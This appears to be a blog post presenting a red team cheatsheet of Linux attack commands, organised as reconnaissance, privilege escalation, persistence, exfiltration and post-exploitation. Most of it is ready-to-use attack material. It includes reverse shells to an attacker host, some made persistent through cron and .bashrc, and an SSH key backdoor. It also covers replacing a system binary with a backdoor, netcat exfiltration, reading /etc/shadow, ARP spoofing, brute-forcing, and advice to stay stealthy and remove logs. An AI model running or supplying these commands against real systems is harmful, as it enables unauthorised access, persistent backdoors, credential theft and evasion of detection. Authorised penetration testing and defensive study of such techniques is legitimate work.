---
title: "The Ultimate Linux Hacker's Cheatsheet for Red Team Offensive Operations"
description: "A comprehensive Linux command and tool cheatsheet tailored for red team offensive operations."
date: "2024-11-29"
tags: ["Linux", "Red Team", "Offensive Security", "Hacking", "Cheatsheet"]
author: "Toity the Elite Blog Writer"
---

# The Ultimate Linux Hacker's Cheatsheet for Red Team Offensive Operations

This cheatsheet provides essential Linux commands, tools, and techniques for red team operations, focusing on reconnaissance, exploitation, persistence, and privilege escalation.

---

## System Reconnaissance

### Gather Basic System Information
```bash
uname -a                   # Kernel version and architecture
cat /etc/os-release        # OS details
hostnamectl                # Hostname and system information
whoami                     # Current user
id                         # Current user ID and group info
```

### Network Information
```bash
ifconfig                   # Network interfaces
ip addr show               # Detailed IP configuration
ip route show              # Display routing table
netstat -tulpn             # Active network connections
ss -tuln                   # Alternative to netstat for connections
```

### User and Group Enumeration
```bash
cat /etc/passwd            # List all users
cat /etc/group             # List all groups
getent passwd              # Enumerate system accounts
who                        # Logged-in users
last                       # Login history
```

---

## File and Process Discovery

### Search Files and Directories
```bash
find / -type f -name "*.conf" 2>/dev/null   # Search for config files
find / -perm -4000 2>/dev/null             # Find SUID binaries
grep -r "password" /etc/                   # Look for password strings
```

### Process Information
```bash
ps aux                       # List all processes
top                          # Real-time process monitor
lsof                         # Open files and the associated processes
```

---

## Privilege Escalation

### SUID Exploitation
```bash
find / -perm -u=s -type f 2>/dev/null  # Locate SUID binaries
```

#### Example: Exploiting `vim` SUID
```bash
vim -c ':!/bin/bash'       # Spawn shell via SUID vim
```

### Kernel Exploits
```bash
# Identify kernel version
uname -r

# Search Exploit DB for matching vulnerabilities
```

### Check Writable Paths
```bash
find / -writable -type d 2>/dev/null    # World-writable directories
```

---

## Persistence Techniques

### Create a Reverse Shell with Cron
```bash
echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1" | crontab -
```

### Add SSH Key for Backdoor Access
```bash
echo "YOUR_SSH_PUBLIC_KEY" >> ~/.ssh/authorized_keys
```

### Replace System Binary with a Backdoor
```bash
mv /usr/bin/victim_binary /usr/bin/victim_binary.bak
cp /tmp/backdoor /usr/bin/victim_binary
chmod +x /usr/bin/victim_binary
```

---

## Network Exploitation

### Scan for Open Ports
```bash
nmap -sS -Pn TARGET_IP      # Stealth TCP scan
```

### Perform ARP Spoofing
```bash
arpspoof -i INTERFACE -t VICTIM_IP GATEWAY_IP
```

### Create a Simple Reverse Shell
```bash
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
```

---

## Data Exfiltration

### Transfer Files via Netcat
#### On Attacker:
```bash
nc -lvp PORT > file.txt
```

#### On Target:
```bash
nc ATTACKER_IP PORT < file.txt
```

### Encode Data for Concealment
```bash
tar -czf - secret_data | base64 > secret_data.b64
```

---

## Post-Exploitation

### Dump Password Hashes
```bash
cat /etc/shadow              # Requires root access
```

### Escalate via Credential Reuse
```bash
ssh USER@VICTIM_IP
```

### Persist via Shell Backdoor
```bash
echo "/bin/bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1" >> ~/.bashrc
```

---

## Useful Tools

| Tool          | Purpose                                  | Command Example                       |
|---------------|------------------------------------------|---------------------------------------|
| `nmap`        | Network scanning and enumeration        | `nmap -sC -sV TARGET`                |
| `netcat`      | Network communication                   | `nc -lvp 4444`                       |
| `metasploit`  | Exploitation framework                  | `msfconsole`                         |
| `hydra`       | Brute-forcing credentials               | `hydra -l admin -P pass.txt HOST ssh`|
| `john`        | Password cracking                       | `john --wordlist=wordlist.txt hashes`|

---

## Tips and Best Practices
- **Stay Stealthy:** Avoid detection by limiting noisy commands.
- **Document Everything:** Keep a log of commands, results, and extracted data.
- **Clean Up:** Remove logs, tools, and temporary files after operations.